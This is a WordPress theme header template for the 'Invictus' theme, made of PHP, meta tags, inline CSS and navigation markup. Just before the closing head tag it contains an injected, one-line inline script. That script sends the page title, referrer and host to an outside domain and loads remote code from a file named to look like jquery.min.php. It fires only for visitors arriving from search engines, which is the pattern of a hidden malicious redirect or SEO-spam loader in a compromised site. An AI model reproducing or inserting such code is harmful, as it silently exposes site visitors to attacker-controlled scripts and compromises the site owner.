<?php
/**
 * @package WordPress
 * @subpackage Invictus
 */

global $wp_query, $page, $paged, $showSuperbgimage, $main_homepage, $isFullsizeFlickr, $isFullsizeGallery, $isPost, $isBlog, $max_main_menu;

?><!DOCTYPE html>
<html <?php language_attributes(); ?> xmlns:fb="http://ogp.me/ns/fb#">
<head>

<meta charset="<?php bloginfo( 'charset' ); ?>" />
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="robots" content="noodp" />
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<!--  Mobile Viewport Fix
j.mp/mobileviewport & davidbcalhoun.com/2010/viewport-metatag
device-width : Occupy full width of the screen in its current orientation
initial-scale = 1.0 retains dimensions instead of zooming out if page height > device height
maximum-scale = 1.0 retains dimensions instead of zooming in if page width < device width
-->
<meta name="viewport" content="target-densitydpi=device-dpi, width=device-width, initial-scale=1.0"/>
<meta name="apple-mobile-web-app-capable" content="yes">

<?php
$page_id = $wp_query->get_queried_object_id();

// get the custom logo if needed
if( get_option_max('custom_logo') == "" ) {
	$logo_url = get_template_directory_uri().'/css/'. get_option_max('color_main') .'/bg-logo.png';
}else{
	$logo_url = get_option_max('custom_logo');
}

// Check for WordPress SEO Plugin by Yoast - if not, output og: meta and custom title
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
if( !is_plugin_active('wordpress-seo/wp-seo.php') ){

	?>
	<title><?php

		// set the page variable on frontpage diffrent than on other pages
		if( is_front_page() ){
			$paged = (get_query_var('page')) ? get_query_var('page') : 1;
		}else{
			$paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
		}

		/*
		 * Print the <title> tag based on what is being viewed.
		 */

		wp_title( '|', true, 'right' );

		// Add a page number if necessary:
		if ( $paged >= 2 || $page >= 2 )
			echo sprintf( __( 'Page %s', 'invictus' ), max( $paged, $page ) ) . ' | ';

		// Add the blog name.
		bloginfo( 'name' );

		// Add the blog description for the home/front page.
		$site_description = get_bloginfo( 'description', 'display' );
		if ( $site_description && ( is_home() || is_front_page() ) )
			echo " | $site_description";

		// Add a page number if necessary:
		if ( $paged >= 2 || $page >= 2 )
			echo ' | ' . sprintf( __( 'Page %s', 'invictus' ), max( $paged, $page ) );

	?>
	</title>

	<!-- Meta tags
	================================================== -->
	<?php
	// Check for correct meta description
	if( is_home() ){
		$meta_desc = get_bloginfo( 'description', 'display' );
	}else{
		if( is_category() || is_tax(GALLERY_TAXONOMY) ){
			$meta_desc = strip_tags(category_description());
		}else{
			setup_postdata( $post );
			$excerpt = get_the_excerpt();
			$meta_desc = strip_tags($excerpt);
			wp_reset_postdata();
		}
	}
	?>
	<meta property="description" content='<?php echo esc_attr( $meta_desc ) ?>' />

	<!-- Google will often use this as its description of your page/site. Make it good. -->
	<meta property="google-site-verification" content='<?php echo esc_attr( $meta_desc ); ?>' />
	<!-- Speaking of Google, don't forget to set your site up: http://google.com/webmasters -->

	<!--open graph meta tags-->
	<?php if( !is_front_page() ) : // do not show post title & details on the homepage ?>
		<meta property="og:title" content="<?php the_title_attribute(); ?>" />
		<meta property="og:site_name" content="<?php bloginfo( 'name' ); ?>" />
		<meta property="og:url" content="<?php echo esc_url( get_permalink() ); ?>" />
		<meta property="og:locale" content="<?php echo get_option_max('post_social_language') ?>" />
		<?php
		if ( (function_exists('has_post_thumbnail')) && (has_post_thumbnail()) ) {
			$_og_imgURL = max_get_image_path($page_id, 'large');
		?>
		<meta property="og:image" content="<?php echo esc_url( $_og_imgURL ) ?>" />
		<meta property="og:image:type" content="image/jpeg" />
		<?php } ?>
		<meta property="og:type" content="article" />
		<meta property="og:description"     content="<?php echo esc_attr($meta_desc); ?>" />

	<?php else :  // get facebook og meta

		// get the og:image if set in the options, else get the logo
		$og_image = get_option_max('social_og_image');
		if($og_image == "") $og_image = $logo_url;

	?>
		<meta property="og:title"           content="<?php bloginfo( 'name' ); ?>" />
		<meta property="og:image"           content="<?php echo esc_url( $og_image ) ?>" />
		<meta property="og:type"            content="website">
		<meta property="og:site_name"       content="<?php bloginfo( 'name' ); ?>" />
		<meta property="og:url"             content="<?php echo esc_url( home_url() ); ?>" />
		<meta property="og:locale"          content="<?php echo get_option_max('post_social_language') ?>" />
		<meta property="og:description"     content="<?php echo esc_attr($meta_desc); ?>" />
	<?php endif ; ?>

<?php } ?>

<?php if(get_option_max('social_fb_admins') != ""){ ?>
	<meta property="fb:admins" content="<?php echo get_option_max('social_fb_admins') ?>" />
<?php } ?>

<?php if(get_option_max('social_fb_appid') != ""){ ?>
	<meta property="fb:app_id" content="<?php echo get_option_max('social_fb_appid') ?>" />
<?php } ?>

<link rel="profile" href="http://gmpg.org/xfn/11" />

<!-- Get the main style CSS -->
<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />

<!-- Font include -->
<?php max_get_google_font_html(); ?>

<?php if ( is_singular() && get_option( 'thread_comments' ) ) wp_enqueue_script( 'comment-reply' ); ?>
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />

<?php wp_head(); ?>

<?php // Main Color styles ?>
<style type="text/css">

	<?php $rgba_1 = max_HexToRGB( get_option_max( 'color_main_typo' ) ) ?>

	a:link, a:visited { color: <?php echo get_option_max( 'color_main_link') ?> }

	nav#navigation li.menu-item a:hover, nav#navigation li.menu-item a:hover { color: <?php echo get_option_max( 'color_nav_link_hover' ) ?> }
	nav#navigation .sfHover ul.sub-menu a:hover, nav#navigation .sfHover ul.sub-menu a:active  { color: <?php echo get_option_max( 'color_pulldown_link_hover' ) ?> }

	#splashscreen { color: <?php echo get_option_max( 'splash_font_color' ) ?> }

	#site-title,
	nav#navigation ul a:hover,
	nav#navigation ul li.sfHover a,
	nav#navigation ul li.current-cat a,
	nav#navigation ul li.current_page_item a,
	nav#navigation ul li.current-menu-item a,
	nav#navigation ul li.current-page-ancestor a,
	nav#navigation ul li.current-menu-parent a,
	nav#navigation ul li.current-menu-ancestor a,
	#colophon,
	#thumbnails .pulldown-items a.activeslide,
	.nav-full-width .main-header {
		border-color: <?php echo get_option_max( 'color_main_typo' ) ?>;
	}

	#thumbnails .scroll-link,
	#fullsizeTimer,
	.blog .date-badge,
	.tag .date-badge,
	.pagination a:hover,
	.pagination span.current,
	#showtitle .imagetitle a,
	#anchorTop,
	.portfolio-fullsize-scroller .scroll-bar .ui-slider-handle,
	.max-mobile-menu a:hover,
	.max-mobile-menu a:active,
	.max-mobile-menu ul ul a:hover,
	.max-mobile-menu ul ul a:active,
	.max-mobile-menu ul ul.open > li.parent-link a.has-submenu {
		background-color: <?php echo get_option_max( 'color_main_typo' ) ?>;
	}

	<?php
	// blank slideshow title background
	if ( get_option_max("fullsize_title_blank") == 'true' ) {
	?>
	#showtitle .imagetitle a { background: none; box-shadow: none; }
	<?php } ?>

	<?php
	// blank slideshow excerpt background
	if ( get_option_max("fullsize_excerpt_blank") == 'true' ) {
	?>
	#showtitle .imagecaption,
	#showtitle .more,
	#showtitle .more a {
		background: none; box-shadow: none;
	}
	<?php } ?>

	#expander, #toggleThumbs {
		background-color: <?php get_option_max( 'color_main_typo' ); ?>;
		background-color: rgba(<?php echo $rgba_1['r'] ?>,<?php echo $rgba_1['g'] ?>,<?php echo $rgba_1['b'] ?>, 0.75);
	}

	#navigation .max-megamenu-wrapper, #navigation .sub-menu {
		background-color: <?php get_option_max( 'color_main_typo' ); ?>;
		background-color: rgba(<?php echo $rgba_1['r'] ?>,<?php echo $rgba_1['g'] ?>,<?php echo $rgba_1['b'] ?>, 0.9);
	}

	nav#navigation ul ul li {
		border-color: rgba(255, 255, 255, 0.5);
	}

	<?php
	// we have a custom main color to use as background
	if( get_option_max( 'color_main_custom_bg' ) != "#" && get_option_max( 'color_main_custom_bg' ) != "" ) :

		$rgba_custom = max_HexToRGB(get_option_max( 'color_main_custom_bg' ), get_option_max( 'color_main_custom_alpha' ) );
		?>

		#primary,
		#sidebar .widget,
		#nivoHolder,
		.external-video,
		#site-title,
		#welcomeTeaser,
		.max_widget_teaser,
		nav#navigation,
		.portfolio-fullsize-scroller .scroll-bar-wrap,
		#primary.portfolio-fullsize-closed .protected-post-form,
		.portfolio-fullsize-grid .pagination,
		.item-caption {
			background: <?php echo get_option_max( 'color_main_custom_bg' ); ?>;
			background: rgba(<?php echo $rgba_custom['r'] ?>,<?php echo $rgba_custom['g'] ?>,<?php echo $rgba_custom['b'] ?>, <?php echo $rgba_custom['a'] ?>);
		}

		.entry-meta {
			background: <?php echo get_option_max( 'color_main_custom_bg' ); ?>;
			background: rgba(<?php echo $rgba_custom['r'] ?>,<?php echo $rgba_custom['g'] ?>,<?php echo $rgba_custom['b'] ?>, 0.5);

		}

		#fsg_playbutton {
			background-color: <?php echo get_option_max( 'color_main_custom_bg' ); ?>;
			background-color: rgba(<?php echo $rgba_custom['r'] ?>,<?php echo $rgba_custom['g'] ?>,<?php echo $rgba_custom['b'] ?>, <?php echo $rgba_custom['a'] ?>);
		}

		.blog .date-badge,
		.tag .date-badge,
		.entry-meta,
		hr.shortcode {
			border-color: <?php echo get_option_max( 'color_main_custom_bg' ); ?>;
		}

		#colophon {
			background: <?php echo get_option_max( 'color_main_custom_bg' ); ?>;
		}

	<?php endif; ?>

</style>

<!--[if lt IE 9]>
<link rel="stylesheet" type="text/css" media="all" href="<?php echo get_template_directory_uri(); ?>/css/ie.css" />
<link rel="stylesheet" type="text/css" media="all" href="<?php echo get_template_directory_uri(); ?>/css/ie_<?php echo get_option_max('color_main') ?>.css" />
<style type="text/css">
	#expander,
	#toggleThumbs,
	nav#navigation ul ul { background-color: <?php echo get_option_max( 'color_main_typo' ) ?>; }
</style>
<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->

<script>
if( jQuery('html').hasClass('touch') ){
	document.write('<script src="<?php echo get_template_directory_uri() ?>/js/iScroll.js"><\/script>')
}
</script>

<?php
if( !isset( $_COOKIE["device_pixel_ratio"] ) ){
?>
<script language="javascript">
(function(){
	if( document.cookie.indexOf('device_pixel_ratio') == -1
			&& 'devicePixelRatio' in window
			&& window.devicePixelRatio == 2 ){

		var date = new Date();
		date.setTime( date.getTime() + 3600000 );

		document.cookie = 'device_pixel_ratio=' + window.devicePixelRatio + ';' +  ' expires=' + date.toUTCString() +'; path=/';
		//if cookies are not blocked, reload the page
		if( document.cookie.indexOf('device_pixel_ratio') != -1) {
				window.location.reload();
		}
	}
})();
</script>
<?php } ?>

<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://alarmagranada.es/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>

<?php
// Check for always fit on homepage or fullsize gallery template
$fit_images = "";

if ( get_option_max('fullsize_fit_always')  == "true" || get_post_meta($page_id, 'max_show_page_fullsize_fit', TRUE) == "true" ){
	$fit_images = "fit-images";
}

if( get_option_max('fullsize_fit_always')  == "false" && get_post_meta($page_id, 'max_show_page_fullsize_fit', TRUE) == "true" ){
	$fit_images = "fit-images";
}

if( get_option_max('fullsize_fit_always')  == "true" && get_post_meta($page_id, 'max_show_page_fullsize_fit', TRUE) == "false" ){
	$fit_images = "";
}

// Fullwidth blog option chekc
$blog_class = $isBlog && get_option_max( 'general_show_fullblog_details' ) == 'true' ? "blog-fullwidth" : "";

// check for fixed nav and logo
$fixed_logo = get_option_max( 'custom_fixed_logo' ) == 'true' ? 'not-fixed' : '';

// check for lazy load images
$lazy_load_images  = get_option_max( 'fullsize_lazyload_thumbnails' ) == 'true' ? 'lazyload-images' : '';

// get infinite scroll if needed
$cssinfinitescroll = get_post_meta( get_the_ID(), MAX_SHORTNAME.'_page_infinite_scroll', true ) == 'true' ? "infinitescroll" : "";

?>

<body <?php body_class(array('max-is-loading', 'preload', $fit_images, $blog_class, get_option_max( 'color_main', 'black' ).'-theme', $fixed_logo, $lazy_load_images, $cssinfinitescroll, 'max-mobile-menu-push', 'nav-' . get_option_max('header_type', 'default') )); ?>>

<?php
// get the splash screen if option is set in theme options
if(get_option_max('splash_show') == 'true' && is_front_page() ) :
	get_template_part( 'includes/home', 'splash.inc' );
endif;
?>

<?php if(!$isFullsizeGallery) : ?>
<div id="anchorTop" class="opacity-hide"><a href="#"><?php _e('Back to top', MAX_SHORTNAME); ?></a></div>
<?php endif; ?>

<?php
// check if we must show superbgimage expander
if ( $main_homepage || $isFullsizeGallery || $isFullsizeFlickr === true || $isFullsizeFlickr === true || get_post_meta($page_id, 'max_show_page_fullsize', true) == 'true' || get_post_meta($page_id, MAX_SHORTNAME.'_show_post_fullsize_value', true) == 'true' ){
?>
	<a href="#" id="expander" class="slide-up">
		<i class="fa fa-angle-up"></i>
		<i class="fa fa-angle-down"></i>
		<span>Hide Content</span>
	</a>
<?php } ?>

<?php // Check for show fullsize background overlay ?>
<?php if( $main_homepage === true && get_option_max( 'homepage_show_fullsize_overlay' ) == 'true' && !$isFullsizeFlickr ){ ?>
<div id="scanlines" class="overlay-<?php echo get_option_max( 'fullsize_overlay_pattern' ) ?>"><?php _e('Image Overlay', MAX_SHORTNAME) ?></div>
<?php } ?>

<?php if ( ( !$main_homepage && get_option_max( 'general_show_fullsize_overlay' ) == 'true' && !$isFullsizeFlickr && !$isFullsizeGallery ) || ( get_option_max('flickr_scanlines') == 'true' && $isFullsizeFlickr === true ) ) { ?>
<div id="scanlines" class="overlay-<?php echo get_option_max( 'fullsize_overlay_pattern' ) ?>"></div>
<?php } ?>

<?php
$fullsizeTemplateOverlay = get_post_meta(get_the_ID(), MAX_SHORTNAME.'_page_fullsize_overlay', true);
if ( $isFullsizeGallery &&  !empty($fullsizeTemplateOverlay) && $fullsizeTemplateOverlay == 'true' ) { ?>
<div id="scanlines" class="overlay-<?php echo get_option_max( 'fullsize_overlay_pattern' ) ?>"></div>
<?php } ?>

<!-- Mobile menu button -->
<button id="mobileMenuButton"><i class="fa fa-bars"><span><?php _e('Show/Hide Menu', MAX_SHORTNAME); ?></span></i></button>
<?php
/* if menu location 'primary-navigation' exists create the responsive navigation */
if ( has_nav_menu( 'primary' ) ) :
	?>
	<nav class="max-mobile-menu max-mobile-menu-vertical max-mobile-menu-left" id="max-mobile-menu">
		<div id="scroller">
		<div class="max-mobile-menu-header"><?php _e('Menu', MAX_SHORTNAME) ?></div>
		<?php
		// get the responsive navigation for mobile screens
		wp_nav_menu( array(
			'theme_location' => 'primary', // your theme location here
			'walker'         => new Max_Mobile_Menu_Walker(),
		));
		?>
		</div>
	</nav>
	<?php
endif;

// get the custom logo if needed
if( get_option_max('custom_logo') == "" ) {
	$logo_url = get_template_directory_uri().'/css/'. get_option_max('color_main') .'/bg-logo-nav-full.png';
}else{
	$logo_url = get_option_max('custom_logo');
}

// get the custom logo if needed
if( get_option_max('custom_logo_2x') == "" ) {
		if( get_option_max('custom_logo') == "" ) {
		$logo_url_2x = get_template_directory_uri().'/css/'. get_option_max('color_main') .'/bg-logo-nav-full@2x.png';
	}else{
		$logo_url_2x = get_option_max('custom_logo');
	}
}else{
	$logo_url_2x = get_option_max('custom_logo_2x');
}

// get custom logo width and height set in the theme options panel
$logo_width = get_option_max('custom_logo_width');
$logo_height = get_option_max('custom_logo_height');

?>

<header role="banner" class="clearfix main-header<?php if(  get_option_max('custom_logo_blank') == 'true' ) echo ' blank-logo"'; ?>">

	<hgroup id="branding" class="navbar">
		<?php if( is_home() ){ ?>
		<h1 id="site-title" class="clearfix">
		<?php }else{ ?>
		<div id="site-title" class="clearfix">
		<?php } ?>
			<a href="<?php echo home_url( '/' ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home">
				<img src="<?php echo esc_url( $logo_url ); ?>" alt="<?php bloginfo( 'name' ); ?> - <?php bloginfo( 'description' ); ?>" class="logo" />
			<?php if(!empty($logo_url_2x)) : ?>
			<img src="<?php echo esc_url( $logo_url_2x ); ?>" alt="<?php echo get_bloginfo('name') ?>" width="<?php echo esc_attr( $logo_width ); ?>" height="<?php echo esc_attr( $logo_height ); ?>" class="logo-retina" />
			<?php endif; ?>
			</a>
		<?php if( is_home() ){ ?>
		</h1>
		<?php }else{ ?>
		</div>
		<?php } ?>
	</hgroup>

	<?php
	// check to show the primary navigation
	$show_menu = get_option_max('custom_hide_menu');
	if( $show_menu === 'false' || empty($show_menu) ) :
	$header_nav	= get_option_max( "header_type", 'default' );
	?>
	<nav id="navigation" role="navigation" class="clearfix">
		<?php if( $header_nav === 'full-height' ) echo '<div class="scroll-wrapper">' ?>
			<ul class="navigation menu max-navbar-nav sf-menu">
			<?php if ( has_nav_menu( 'primary' ) ) { /* if menu location 'primary-menu' exists then use custom menu */
				echo $max_main_menu;
			} else { /* else use wp_list_pages */?>
				<li class="no-menu"><?php _e('Please create and attach a menu in your "Appearance > Menus" section for "Primary Navigation" menu location.', MAX_SHORTNAME); ?></li>
			<?php } ?>
			</ul>
		<?php if( $header_nav === 'full-height' ) echo '</div>' ?>
	</nav><!-- #navigation -->
	<?php endif; ?>

</header><!-- #branding -->

<?php
	// Check if we are on the main front page Welcome teaser should be shown
	if( $main_homepage === true && get_option_max('homepage_show_welcome_teaser') == 'true' ){
	$welcome = stripslashes( get_option_max('homepage_welcome_teaser') ); ?>
	<div id="welcomeTeaser"<?php if( get_option_max('mobile_show_welcome_teaser', 'false') == 'true'){ ?> class="show-teaser"<?php } ?>><span class="inner"><?php echo $welcome ?></span></div>
<?php } ?>

<div id="page">

	<div id="main" class="clearfix zIndex">